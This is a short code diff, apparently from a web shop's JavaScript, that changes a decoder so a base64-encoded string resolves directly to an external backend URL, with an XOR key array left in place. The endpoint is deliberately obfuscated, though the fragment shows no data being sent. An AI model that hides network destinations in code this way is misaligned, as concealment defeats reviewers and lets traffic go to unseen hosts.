@@ -1376,14 +1376,10 @@ const SHOP_ID = 244378;
 
 const _OBF = 'aHR0cHM6Ly9hcGkubHVhcnNtcC5ydTo4NDQz';
 const _K = [0x2B,0x4F,0x1A,0x7D,0x63,0x91,0x3C,0x5E,0x27,0x88,0x42,0x6B,0x11,0x9F,0x35,0x74];
+
 function _d(s){
   try{
-    const bin = atob(s);
-    let out = '';
-    for(let i=0;i<bin.length;i++){
-      out += String.fromCharCode(bin.charCodeAt(i) ^ _K[i % _K.length]);
-    }
-    return out;
+    return atob(s);
   }catch(e){ return ''; }
 }
 const BACKEND_URL = _d(_OBF);
